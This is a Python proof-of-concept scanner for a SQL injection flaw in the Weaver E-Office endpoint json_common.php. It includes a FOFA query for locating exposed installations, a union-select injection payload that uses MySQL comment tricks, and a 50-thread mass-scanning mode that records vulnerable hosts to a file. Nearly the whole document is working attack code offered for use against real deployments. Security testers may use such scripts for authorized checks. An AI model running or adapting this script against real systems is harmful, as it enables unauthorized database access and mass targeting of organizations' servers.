# 泛微E-Office json_common.php SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="泛微-EOffice"

def banner():
    test = """
███████╗██╗    ██╗ ██████╗ ███████╗███████╗██╗ ██████╗███████╗    ███████╗ ██████╗ ██╗     
██╔════╝██║    ██║██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝    ██╔════╝██╔═══██╗██║     
█████╗  ██║ █╗ ██║██║   ██║█████╗  █████╗  ██║██║     █████╗█████╗███████╗██║   ██║██║     
██╔══╝  ██║███╗██║██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝╚════╝╚════██║██║▄▄ ██║██║     
██║     ╚███╔███╔╝╚██████╔╝██║     ██║     ██║╚██████╗███████╗    ███████║╚██████╔╝███████╗
╚═╝      ╚══╝╚══╝  ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝    ╚══════╝ ╚══▀▀═╝ ╚══════╝

"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微E-Office json_common.php SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/building/json_common.php"
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2227.0Safari/537.36',
        'Connection': 'close',
        'Content-Length': '87',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(1) ,4#|2|333"

    try:
        response = requests.post(url=target + api_payload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()